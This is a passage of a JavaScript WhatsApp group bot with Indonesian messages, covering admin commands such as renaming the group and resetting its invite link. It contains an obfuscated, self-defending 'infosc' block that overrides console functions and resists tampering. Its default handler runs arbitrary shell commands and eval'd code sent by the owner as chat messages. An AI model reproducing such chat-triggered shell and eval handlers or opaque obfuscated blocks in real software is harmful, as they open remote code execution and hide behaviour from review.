teks += `• @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'setname':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
Dhani.groupUpdateSubject(from, `${body.slice(9)}`)
Dhani.sendMessage(from, `\`\`\`Sukses ✅, Mengganti nama grup menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setdesc':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
Dhani.groupUpdateDescription(from, `${body.slice(9)}`)
Dhani.sendMessage(from, `\`\`\`Sukses ✅, Mengganti deskripsi grup\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setppgrup':
case 'setpp':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await Dhani.downloadMediaMessage(encmedia)
Dhani.updateProfilePicture(from, media)
.then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
} else {
reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
break
case 'hidetag':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)
try {
quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
hideTag(from, `${quotedText}`)
} catch {
hideTag(from, `${q}`)
}
break
case 'infogc':
case 'infogrup':
case 'infogrouup':
case 'grupinfo':
case 'groupinfo':
if (!isGroup) return reply(mess.only.group)
try {
var pic = await Dhani.getProfilePicture(from)
} catch {
var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n\n${groupMetadata.desc}`
Dhani.sendMessage(from, await getBuffer(pic), image, {quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
json = ['action', 'inviteReset', from]
Dhani.query({json, expect200: true})
reply('Sukses Mereset Link Group')
break
case 'online':
case 'listonline':
case 'here':          
if (!isGroup) return reply(mess.only.group)
try {
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(Dhani.chats.get(ido).presences), Dhani.user.jid]
Dhani.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: fkon, contextInfo: { mentionedJid: online }})
} catch (e) {
reply(`${e}`)
}
break
case 'speed':
			case 'ping':
					const timestampi = speed();
					const latensyi = speed() - timestampi
					reply(`Speed: ${latensyi.toFixed(4)} Second`)
					break
/*ENC AJG GAK USAH
UBAH² AJG HARGAIN COK
JANGAN LUH HAPUS ININYA AJG
INTINYA JANGAN LUH HAPUS
JANGAN LUH UBAH²
KETAHUAN ? 
HATI² LUH BANG*/
case 'infosc':
function _0x55d73a(_0x307a83,_0x2f7926,_0x564344,_0x521346){return _0x1bac(_0x521346- -0x188,_0x564344);}(function(_0x36e602,_0xe6a3c5){var _0x50a646=_0x36e602();function _0x26beaf(_0x291d38,_0x19e3df,_0x46116d,_0x2890cf){return _0x1bac(_0x19e3df-0x33f,_0x46116d);}function _0x1aec20(_0x2b3087,_0x3cb1ec,_0x956d14,_0x1201e3){return _0x1bac(_0x3cb1ec-0xb9,_0x2b3087);}while(!![]){try{var _0x488ace=-parseInt(_0x26beaf(0x424,0x425,0x421,0x43f))/(0x1*0x1c5+0x1331+-0x25*0x91)+parseInt(_0x1aec20(0x1bc,0x1ca,0x1d8,0x1e7))/(-0xa31+0xb84*-0x2+0x213b)*(parseInt(_0x26beaf(0x458,0x459,0x46b,0x46b))/(0x1c16+-0x3a*-0x2e+-0x267f))+-parseInt(_0x1aec20(0x1bf,0x1af,0x19a,0x1a5))/(-0x12c*-0x3+0x2001+0x3d*-0x95)+parseInt(_0x26beaf(0x45f,0x43e,0x462,0x427))/(-0x1*-0xa75+0x11f7+-0x1c67)*(-parseInt(_0x1aec20(0x1d5,0x1cc,0x1dd,0x1d1))/(-0x112e+-0x397*0x1+-0x14cb*-0x1))+-parseInt(_0x26beaf(0x440,0x43b,0x420,0x438))/(0xfa3+-0x2*0xa4e+0x500)*(parseInt(_0x1aec20(0x1a0,0x1bb,0x1a6,0x1d7))/(0x69+-0x182b*0x1+0x17ca))+-parseInt(_0x1aec20(0x198,0x1bc,0x1a4,0x1a2))/(-0x197*-0xa+0x5d*0x56+-0x1*0x2f1b)*(-parseInt(_0x1aec20(0x187,0x197,0x179,0x1b0))/(0xf94+-0x51d*-0x5+0x1*-0x291b))+parseInt(_0x1aec20(0x1ae,0x1b4,0x1b4,0x1a8))/(-0x570+0x6a8+-0x1*0x12d)*(parseInt(_0x26beaf(0x41d,0x440,0x44e,0x42d))/(0x3*-0x3a6+-0x171d+-0x221b*-0x1));if(_0x488ace===_0xe6a3c5)break;else _0x50a646['push'](_0x50a646['shift']());}catch(_0x54285f){_0x50a646['push'](_0x50a646['shift']());}}}(_0x4613,0x4611a+-0x290d3+0x3ae66));function _0x1bac(_0x48e481,_0x44f337){var _0x333d0d=_0x4613();return _0x1bac=function(_0x270c32,_0x48bc77){_0x270c32=_0x270c32-(0x2325+-0x70*-0x46+-0x40e9);var _0x404f3c=_0x333d0d[_0x270c32];if(_0x1bac['gIqarz']===undefined){var _0x5771ef=function(_0x2daa99){var _0x3c5c0c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x58dd7f='',_0x42549f='',_0x1ea4a1=_0x58dd7f+_0x5771ef;for(var _0x389fe7=-0x25d6+-0x12*-0x199+-0x14c*-0x7,_0x30cb45,_0x21d9bd,_0x47980f=0x127*0x8+0x114f+-0x1a87;_0x21d9bd=_0x2daa99['charAt'](_0x47980f++);~_0x21d9bd&&(_0x30cb45=_0x389fe7%(-0x530+-0x5dd*-0x2+0x1*-0x686)?_0x30cb45*(-0x1f3a+0x2aa+0x4*0x734)+_0x21d9bd:_0x21d9bd,_0x389fe7++%(0xfdd+0x11f*-0x9+-0x5c2))?_0x58dd7f+=_0x1ea4a1['charCodeAt'](_0x47980f+(-0x1fc1+0x333+0x14*0x16e))-(-0x1e0a+0x178+0x1c9c)!==-0xc2e*-0x1+0x1f1d+-0x2b4b?String['fromCharCode'](-0xef*0xe+-0xd0*-0x2b+0x19b*-0xd&_0x30cb45>>(-(-0x7d5*-0x1+0x173a*-0x1+-0x1*-0xf67)*_0x389fe7&0x24a*-0x1+-0x215f*-0x1+-0x1*0x1f0f)):_0x389fe7:0x5*0x4d+0x1266+-0x13e7){_0x21d9bd=_0x3c5c0c['indexOf'](_0x21d9bd);}for(var _0x799046=-0x9a3*-0x3+-0x25*0x36+-0x3*0x709,_0x6103fc=_0x58dd7f['length'];_0x799046<_0x6103fc;_0x799046++){_0x42549f+='%'+('00'+_0x58dd7f['charCodeAt'](_0x799046)['toString'](0x1158+0x2*-0x55f+0x117*-0x6))['slice'](-(0x1398+-0x27+-0x1*0x136f));}return decodeURIComponent(_0x42549f);};_0x1bac['iRiJUO']=_0x5771ef,_0x48e481=arguments,_0x1bac['gIqarz']=!![];}var _0x423fc9=_0x333d0d[0x3e4*-0x4+0x7ff+0x791],_0x1e7034=_0x270c32+_0x423fc9,_0x4ce85c=_0x48e481[_0x1e7034];if(!_0x4ce85c){var _0x59350c=function(_0x4fed7d){this['ZOpwiT']=_0x4fed7d,this['CGdatX']=[-0x1fa*0xf+0x814+0x1593,-0xaf7*-0x1+-0x1*0xfc5+0x1*0x4ce,-0x25cf+0x2c*-0x57+0x1*0x34c3],this['IYJSun']=function(){return'newState';},this['nlwSRu']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['NMAYaG']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x59350c['prototype']['GiYtjC']=function(){var _0x25dcef=new RegExp(this['nlwSRu']+this['NMAYaG']),_0xfe37ac=_0x25dcef['test'](this['IYJSun']['toString']())?--this['CGdatX'][0x1969+0xc75+-0x25dd]:--this['CGdatX'][0x5e*-0x51+0x795*-0x5+0x43a7];return this['GJNEqQ'](_0xfe37ac);},_0x59350c['prototype']['GJNEqQ']=function(_0x1842f0){if(!Boolean(~_0x1842f0))return _0x1842f0;return this['FgUsaU'](this['ZOpwiT']);},_0x59350c['prototype']['FgUsaU']=function(_0x573f72){for(var _0x17bce9=0x1c*-0x2c+0x1*0xf59+-0x383*0x3,_0x22eca8=this['CGdatX']['length'];_0x17bce9<_0x22eca8;_0x17bce9++){this['CGdatX']['push'](Math['round'](Math['random']())),_0x22eca8=this['CGdatX']['length'];}return _0x573f72(this['CGdatX'][-0x5*0x1e7+-0x251*0x5+-0x64*-0x36]);},new _0x59350c(_0x1bac)['GiYtjC'](),_0x404f3c=_0x1bac['iRiJUO'](_0x404f3c),_0x48e481[_0x1e7034]=_0x404f3c;}else _0x404f3c=_0x4ce85c;return _0x404f3c;},_0x1bac(_0x48e481,_0x44f337);}function _0x4613(){var _0x5ea3cd=['ntr4yuDeC3O','DgXUwgK','y3rVCIGICMv0Dq','E30Uy29UC3rYDq','DhjHy2u','D2Hvu20','ChjVDg90ExbL','DcbIEsa6ierOyq','r0H2A1C','idOG','Dg9tDhjPBMC','y29UC29Szq','rgjjDLO','BMn0Aw9UkcKG','mM1hshHhvW','EgXTqLu','nJeXmtu0BeHwvwjU','DuHluhO','uxjIrxq','zxHJzxb0Aw9U','Bg9N','DgfIBgu','zxjYB3i','mZmWndC0uKrlAfrZ','mZm2mdm1otekcG','C2vHCMnO','uxvWDg8','yxbWBhK','BgvUz3rO','cGRIGkiGkLnJCMLW','DgPis0O','y29UC3rYDwn0BW','cUkSOYbjtKzpifnd','Ae9pAMK','rfHqvum','D2fYBG','otyYnZbAD0nqrxm','C3bSAxq','AunjrMq','BMLHu2C','v0jqqwy','kcGOlISPkYKRkq','kGPuywCGoIba','vM10A3y','mZmXoeDqDvb6Ba','nxWXFdn8mhW0Fa','ntKXqhmUD2HHDa','zYa6iea2mJGXmW','4OcIicPoDw1Wyw5N','zKjRBeO','CM4GDgHPCYiPka','wK1Pz0W','BMLhyw5ZkGPuyq','rLLcu1u','Cc5Uzxq','vgPywuq','x19WCM90B19F','q2jlC3G','C2fWCc5Uzxq','Aw5MBW','mJG0nZCXmMnsELbdAa','vwjzB2i','ENnWu3y','yMLUza','CMv0DxjUicHMDq','otm1AfrcBvjY','nZC3u2PiEKDq','vhvKtfq','z3fjAw0','mZvLEgffDhO','ugrqB0m','mJmWote2y3fKs1D3','mta5nLzozg1dyq'];_0x4613=function(){return _0x5ea3cd;};return _0x4613();}var _0x1de77d=(function(){var _0x1d7ea9={};_0x1d7ea9[_0x5ba276(0x3ff,0x3e5,0x3ee,0x3e3)]=function(_0x21d631,_0x52a4b3){return _0x21d631+_0x52a4b3;},_0x1d7ea9[_0x5ba276(0x420,0x426,0x42e,0x408)]=_0x5ba276(0x408,0x3fc,0x3ec,0x41c)+_0x3a7527(0x1a,-0x6,0x1c,0x2f);function _0x3a7527(_0x5313da,_0xfbdee6,_0x285b93,_0x212b87){return _0x1bac(_0x285b93- -0xf4,_0x212b87);}_0x1d7ea9[_0x3a7527(0x2,0x0,-0x12,-0x29)]=_0x5ba276(0x403,0x426,0x3df,0x402),_0x1d7ea9[_0x3a7527(0x29,-0x15,0x4,-0x14)]=_0x5ba276(0x427,0x428,0x43d,0x441),_0x1d7ea9[_0x5ba276(0x40c,0x3f1,0x413,0x407)]=function(_0x1d0d80,_0x2900e0){return _0x1d0d80<_0x2900e0;},_0x1d7ea9['tjHKJ']=function(_0xaf6f97,_0x29e4d2){return _0xaf6f97!==_0x29e4d2;};function _0x5ba276(_0x2433c2,_0x508472,_0x277420,_0x1fce99){return _0x1bac(_0x2433c2-0x30e,_0x1fce99);}_0x1d7ea9['uHKPz']='LBvNJ';var _0x1ef220=_0x1d7ea9,_0x197932=!![];return function(_0x53f316,_0x5ca396){var _0x18e374=_0x197932?function(){function _0x228dfb(_0x3c3705,_0x353854,_0xa2e5b6,_0x222f17){return _0x1bac(_0xa2e5b6- -0x332,_0x3c3705);}var _0x24fe70={'CbKsx':function(_0x27c30a,_0x42e0e1){return _0x27c30a(_0x42e0e1);},'QrbEt':function(_0x189779,_0x58eeb1){return _0x1ef220['TjXYD'](_0x189779,_0x58eeb1);},'fBklJ':_0x1ef220[_0x33cbc7(0x123,0x10e,0x120,0x110)],'PPKqp':_0x33cbc7(0x11b,0xe8,0x10a,0x104)+_0x228dfb(-0x24e,-0x21d,-0x22d,-0x21a)+_0x33cbc7(0xcc,0x100,0xfa,0xea)+'\x20)','PdPoC':_0x1ef220['WBPAf'],'niaSg':_0x1ef220[_0x33cbc7(0x100,0x10f,0xe2,0xf6)],'WwIAk':'exception','hOOji':_0x228dfb(-0x220,-0x21d,-0x22b,-0x23a),'UbYob':function(_0x4f770f,_0x147a28){function _0x1d6ce2(_0xe91a16,_0x3cfb0b,_0x8a8d0,_0x39d162){return _0x33cbc7(_0xe91a16,_0x3cfb0b-0x123,_0x8a8d0-0x10a,_0x8a8d0- -0x1b1);}return _0x1ef220[_0x1d6ce2(-0xc7,-0xa2,-0xb5,-0xb4)](_0x4f770f,_0x147a28);}};function _0x33cbc7(_0x43a786,_0x1ee6c9,_0x2ee5cb,_0x270278){return _0x1bac(_0x270278- -0x2,_0x43a786);}if(_0x1ef220[_0x33cbc7(0xfe,0x13e,0x12e,0x11f)](_0x1ef220[_0x33cbc7(0x126,0x119,0x120,0x112)],_0x1ef220[_0x33cbc7(0xf6,0x116,0x110,0x112)])){var _0x34006b;try{var _0x5f193e=_0x24fe70[_0x228dfb(-0x25b,-0x263,-0x23f,-0x253)](_0x398cbe,_0x24fe70[_0x228dfb(-0x21f,-0x23b,-0x21d,-0x200)](_0x24fe70[_0x33cbc7(0xe3,0xfe,0xf2,0xe9)]+_0x24fe70['PPKqp'],');'));_0x34006b=_0x5f193e();}catch(_0x534abb){_0x34006b=_0xaa0a12;}var _0x4ac0de=_0x34006b['console']=_0x34006b['console']||{},_0x5e0f76=[_0x33cbc7(0x121,0x12b,0xfb,0x115),_0x33cbc7(0xc1,0xf9,0xbf,0xdb),_0x24fe70[_0x33cbc7(0x104,0x101,0xe1,0xfe)],_0x24fe70[_0x228dfb(-0x240,-0x250,-0x251,-0x24f)],_0x24fe70['WwIAk'],_0x33cbc7(0x113,0x139,0x118,0x116),_0x24fe70[_0x33cbc7(0x116,0x11b,0x13f,0x122)]];for(var _0x1fc27a=0x72d*0x4+-0x1704+0x8*-0xb6;_0x24fe70[_0x33cbc7(0xf1,0xe9,0xfd,0xf5)](_0x1fc27a,_0x5e0f76[_0x33cbc7(0x102,0x109,0x132,0x11d)]);_0x1fc27a++){var _0x3be12e=('5|2|3|0|4|'+'1')[_0x33cbc7(0xbe,0xce,0x101,0xdd)]('|'),_0x2cceac=0x1844+0x3*-0x515+-0x905;while(!![]){switch(_0x3be12e[_0x2cceac++]){case'0':_0x57802a['__proto__']=_0x3d1249[_0x33cbc7(0x105,0xdb,0x110,0xf7)](_0x1c7117);continue;case'1':_0x4ac0de[_0x2d9807]=_0x57802a;continue;case'2':var _0x2d9807=_0x5e0f76[_0x1fc27a];continue;case'3':var _0x15fb4d=_0x4ac0de[_0x2d9807]||_0x57802a;continue;case'4':_0x57802a[_0x33cbc7(0x124,0x119,0x10a,0x10b)]=_0x15fb4d[_0x33cbc7(0x111,0xfc,0x117,0x10b)]['bind'](_0x15fb4d);continue;case'5':var _0x57802a=_0x1025d1[_0x228dfb(-0x205,-0x22b,-0x210,-0x222)+'r'][_0x33cbc7(0x109,0xf2,0x12a,0x107)][_0x33cbc7(0xe0,0xed,0xf7,0xf7)](_0x24db56);continue;}break;}}}else{if(_0x5ca396){var _0xcdd714=_0x5ca396[_0x228dfb(-0x231,-0x208,-0x214,-0x221)](_0x53f316,arguments);return _0x5ca396=null,_0xcdd714;}}}:function(){};return _0x197932=![],_0x18e374;};}()),_0x52c923=_0x1de77d(this,function(){function _0x7b5145(_0x527155,_0x462f7a,_0x2f1977,_0x54d85d){return _0x1bac(_0x462f7a- -0x282,_0x2f1977);}var _0x3689a1={};function _0x586069(_0x573482,_0x2935da,_0x5bce3f,_0xeee165){return _0x1bac(_0x573482-0x2ae,_0x2935da);}_0x3689a1[_0x7b5145(-0x17b,-0x193,-0x19c,-0x199)]='(((.+)+)+)'+'+$';var _0x321c51=_0x3689a1;return _0x52c923[_0x7b5145(-0x15d,-0x175,-0x185,-0x170)]()[_0x586069(0x3ca,0x3b7,0x3b7,0x3b3)](_0x321c51[_0x7b5145(-0x172,-0x193,-0x1b6,-0x179)])['toString']()[_0x586069(0x3d0,0x3f0,0x3ce,0x3e6)+'r'](_0x52c923)[_0x7b5145(-0x186,-0x166,-0x189,-0x175)](_0x7b5145(-0x185,-0x19f,-0x189,-0x1a3)+'+$');});_0x52c923();function _0x1c95e6(_0x2006b5,_0x49bdec,_0x42af55,_0x59ba0a){return _0x1bac(_0x49bdec-0x1e3,_0x2006b5);}var _0x15aad6=(function(){var _0x5e19d0=!![];return function(_0x39cae6,_0x3fe916){var _0x932965=_0x5e19d0?function(){if(_0x3fe916){var _0xab4d23=_0x3fe916['apply'](_0x39cae6,arguments);return _0x3fe916=null,_0xab4d23;}}:function(){};return _0x5e19d0=![],_0x932965;};}()),_0x3df7c7=_0x15aad6(this,function(){function _0x528cf4(_0x303616,_0x4ec692,_0x5c4a66,_0x1fc892){return _0x1bac(_0x4ec692- -0x8c,_0x1fc892);}var _0x1eb145={'DXPUC':function(_0x109d84,_0x266e8b){return _0x109d84(_0x266e8b);},'GHvkW':function(_0x2e9566,_0x5b17fb){return _0x2e9566+_0x5b17fb;},'ZMigL':'return\x20(fu'+_0x1f7021(-0x232,-0x24d,-0x25f,-0x262),'Qupto':_0x1f7021(-0x25c,-0x257,-0x238,-0x23a)+'ctor(\x22retu'+'rn\x20this\x22)('+'\x20)','DbIvZ':function(_0x4eb7dd){return _0x4eb7dd();},'SMhRe':_0x1f7021(-0x237,-0x244,-0x250,-0x242),'whUSm':_0x528cf4(0x8e,0x8a,0xac,0xaa),'GdvAD':'trace','iCIFd':function(_0x2a557a,_0x293674){return _0x2a557a<_0x293674;},'tlnXi':'WRuin','TudLT':_0x1f7021(-0x25d,-0x278,-0x287,-0x285)};function _0x1f7021(_0x2b6cc5,_0x385a57,_0x2e345d,_0x2aff83){return _0x1bac(_0x385a57- -0x35d,_0x2e345d);}var _0x4872be;try{var _0x36bd00=_0x1eb145[_0x528cf4(0x4b,0x50,0x33,0x73)](Function,_0x1eb145[_0x1f7021(-0x257,-0x252,-0x250,-0x23a)](_0x1eb145[_0x528cf4(0x54,0x61,0x5e,0x76)]+_0x1eb145[_0x528cf4(0x6d,0x91,0xa3,0x9d)],');'));_0x4872be=_0x1eb145[_0x1f7021(-0x268,-0x24e,-0x26d,-0x245)](_0x36bd00);}catch(_0x2ca1cc){_0x4872be=window;}var _0x27140e=_0x4872be[_0x1f7021(-0x261,-0x24f,-0x23f,-0x23e)]=_0x4872be[_0x528cf4(0x97,0x82,0xa4,0x76)]||{},_0x3542b9=['log',_0x528cf4(0x31,0x51,0x57,0x6e),_0x1f7021(-0x284,-0x268,-0x263,-0x257),_0x1eb145['SMhRe'],_0x1eb145[_0x528cf4(0x7b,0x7c,0x5f,0x6a)],_0x1f7021(-0x221,-0x245,-0x24e,-0x240),_0x1eb145['GdvAD']];for(var _0x4a5123=0x99*0x17+0x18ac+-0x266b;_0x1eb145[_0x528cf4(0x4f,0x54,0x49,0x79)](_0x4a5123,_0x3542b9[_0x1f7021(-0x235,-0x23e,-0x22a,-0x25f)]);_0x4a5123++){if(_0x1eb145[_0x528cf4(0x7a,0x78,0x55,0x85)]!==_0x1eb145[_0x528cf4(0x81,0x71,0x67,0x7c)]){var _0x47c346=(_0x1f7021(-0x276,-0x276,-0x252,-0x290)+'2')[_0x1f7021(-0x29a,-0x27e,-0x289,-0x288)]('|'),_0x35d004=-0x1*0xe4b+-0x386*0x7+-0x1*-0x26f5;while(!![]){switch(_0x47c346[_0x35d004++]){case'0':_0x437c3d[_0x1f7021(-0x248,-0x26b,-0x257,-0x289)]=_0x15aad6[_0x1f7021(-0x271,-0x264,-0x252,-0x26b)](_0x15aad6);continue;case'1':var _0x5851eb=_0x3542b9[_0x4a5123];continue;case'2':_0x27140e[_0x5851eb]=_0x437c3d;continue;case'3':var _0x4c94e8=_0x27140e[_0x5851eb]||_0x437c3d;continue;case'4':_0x437c3d[_0x1f7021(-0x230,-0x250,-0x242,-0x26d)]=_0x4c94e8[_0x1f7021(-0x255,-0x250,-0x266,-0x250)][_0x1f7021(-0x283,-0x264,-0x25b,-0x251)](_0x4c94e8);continue;case'5':var _0x437c3d=_0x15aad6[_0x528cf4(0x93,0x96,0x93,0x8f)+'r'][_0x528cf4(0x75,0x7d,0x8b,0x7a)][_0x528cf4(0x51,0x6d,0x88,0x65)](_0x15aad6);continue;}break;}}else{var _0x6bb5a9=_0x1eb145[_0x528cf4(0x44,0x50,0x32,0x3d)](_0x4ec25f,_0x1eb145[_0x1f7021(-0x257,-0x252,-0x237,-0x272)](_0x1eb145[_0x1f7021(-0x260,-0x252,-0x22e,-0x256)](_0x1eb145[_0x1f7021(-0x25c,-0x270,-0x28c,-0x28a)],_0x1eb145[_0x528cf4(0x97,0x91,0x84,0x6d)]),');'));_0x3554e4=_0x6bb5a9();}}});_0x3df7c7(),taggg=_0x1c95e6(0x2ea,0x306,0x2ed,0x31e)+_0x55d73a(-0x77,-0x71,-0x4c,-0x68)+_0x1c95e6(0x300,0x2ed,0x2dd,0x300)+_0x55d73a(-0xa4,-0xa9,-0x81,-0x9a)+_0x1c95e6(0x2db,0x2cc,0x2ea,0x2de)+_0x1c95e6(0x307,0x2fe,0x323,0x2f5)+_0x1c95e6(0x2e6,0x2cd,0x2e0,0x2c4)+_0x55d73a(-0x81,-0x75,-0x5b,-0x7c)+ownername+_0x1c95e6(0x2c7,0x2c7,0x2c4,0x2b1)+owner,mentions(taggg,['6281333603'+_0x55d73a(-0x7d,-0x7e,-0x9e,-0xa0)+_0x1c95e6(0x2c2,0x2d7,0x2e1,0x2eb),owner+('@s.whatsap'+_0x1c95e6(0x2ee,0x2d3,0x2ec,0x2d1))],!![]);
break

//━━━━━━━━━━━━━━━[ AKHIR DARI SEMUA FITUR ]━━━━━━━━━━━━━━━━━//
				
default:
if (isOwner) {
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (isOwner) {
if (budy.startsWith('>')) {
console.log(color('[ EVAL ]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
reply(`${evaled}`)
} catch (err) {
reply(`${err}`)
}
}
}
}
}
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}


	
    
